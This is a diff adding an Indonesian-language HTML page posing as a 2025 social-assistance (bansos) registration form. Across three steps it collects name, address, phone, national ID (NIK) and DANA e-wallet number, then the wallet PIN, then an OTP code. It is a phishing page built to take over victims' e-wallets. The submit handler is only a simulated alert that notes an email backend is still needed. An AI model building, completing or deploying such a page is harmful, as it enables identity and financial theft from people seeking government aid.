@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pendaftaran Bansos 2025</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      color: #fff;
+      overflow: hidden;
+      background: linear-gradient(-45deg, #2980b9, #6dd5fa, #ffffff, #3498db);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      background: rgba(0,0,50,0.5);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #2980b9;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1f6391;
+    }
+
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <form id="bansosForm">
+    <!-- Halaman 1 -->
+    <div class="form-step active" id="step-1">
+      <h2>Form Pendaftaran</h2>
+      <input type="text" name="nama" placeholder="Nama Lengkap" required>
+      <input type="text" name="alamat" placeholder="Alamat" required>
+      <input type="tel" name="hp" placeholder="No HP" required>
+      <input type="text" name="nik" placeholder="NIK" required>
+      <input type="text" name="dana" placeholder="No DANA (e-wallet)" required>
+      <button type="button" onclick="nextStep(2)">Klik Berikutnya</button>
+    </div>
+
+    <!-- Halaman 2 -->
+    <div class="form-step" id="step-2">
+      <h2>Verifikasi DANA</h2>
+      <input type="password" name="pin" placeholder="Masukkan PIN DANA" required>
+      <button type="button" onclick="nextStep(3)">Klik Berikutnya</button>
+    </div>
+
+    <!-- Halaman 3 -->
+    <div class="form-step" id="step-3">
+      <h2>Verifikasi OTP</h2>
+      <input type="text" name="otp" placeholder="Masukkan Kode OTP" required>
+      <button type="submit">Kirim</button>
+    </div>
+  </form>
+</div>
+
+<script>
+  function nextStep(step) {
+    document.querySelectorAll('.form-step').forEach(f => f.classList.remove('active'));
+    document.getElementById('step-' + step).classList.add('active');
+  }
+
+  document.getElementById('bansosForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    alert("Formulir berhasil dikirim (simulasi). Untuk pengiriman ke email, perlu backend.");
+  });
+</script>
+
+</body>
+</html>
